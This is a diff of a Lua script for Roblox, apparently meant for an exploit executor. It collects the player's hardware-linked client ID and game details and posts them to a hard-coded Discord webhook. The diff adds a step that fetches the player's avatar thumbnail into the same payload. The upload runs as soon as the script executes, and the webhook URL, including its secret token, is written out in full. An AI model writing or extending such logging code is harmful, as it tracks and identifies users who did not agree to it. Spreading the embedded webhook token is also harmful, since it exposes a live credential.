@@ -9,8 +9,32 @@ local MarketplaceService = cloneref(game:GetService("MarketplaceService"))
 local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
+-- Function to retrieve the user's thumbnail
+function getThumbnail(userId)
+    local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
+    local success, result = pcall(function()
+        return HttpService:GetAsync(apiUrl)
+    end)
+
+    if success then
+        local response = HttpService:JSONDecode(result)
+        if response and response["data"] and response["data"][1] and response["data"][1]["imageUrl"] then
+            return response["data"][1]["imageUrl"]
+        else
+            warn("Failed to retrieve thumbnail data.")
+            return nil
+        end
+    else
+        warn("Error fetching thumbnail: " .. tostring(result))
+        return nil
+    end
+end
+
 -- Webhook URL
 local webhookUrl = "https://discord.com/api/webhooks/1318961945424166973/TBy_bcaVzjkMko3QO4WYK4gRMPlyMReyFn7Tt9jB9ZSObcVCaGnAzCrp8RjQinFbqdjY"
+
+-- Get the player's avatar thumbnail URL
+local thumbnailUrl = getThumbnail(game.Players.LocalPlayer.UserId)
 
 -- Data to send to the webhook
 local payload = {
@@ -60,6 +84,9 @@ local payload = {
                     ["inline"] = false
                 }
             },
+            ["thumbnail"] = {
+                ["url"] = thumbnailUrl or "https://via.placeholder.com/75" -- Fallback if thumbnail retrieval fails
+            },
             ["footer"] = {
                 ["text"] = "Information sent via script",
             },
@@ -88,4 +115,5 @@ local function sendToWebhook()
     end
 end
 
+-- Call the function
 sendToWebhook()
